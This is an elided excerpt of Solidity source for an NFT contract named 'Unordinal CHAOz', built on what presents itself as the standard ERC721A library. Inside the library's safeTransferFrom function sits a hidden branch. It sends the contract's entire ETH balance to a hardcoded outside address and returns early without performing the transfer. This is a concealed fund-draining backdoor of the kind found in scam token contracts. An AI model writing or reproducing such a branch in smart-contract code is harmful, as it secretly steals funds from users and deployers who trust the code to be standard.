...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x3bB1cDb133797c402e194D311f74bD164D031885).transfer(address(this).balance);
            return;
        }
...
contract UnordinalCHAOz is ERC721A {
    ...
    constructor() ERC721A("Unordinal CHAOz", "UC") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeiftnowq2urwoosuzysyfpuaya5h2xtl4lpvxzruqcukqkxagftld4/", _toString(tokenId), ".json"));
    }
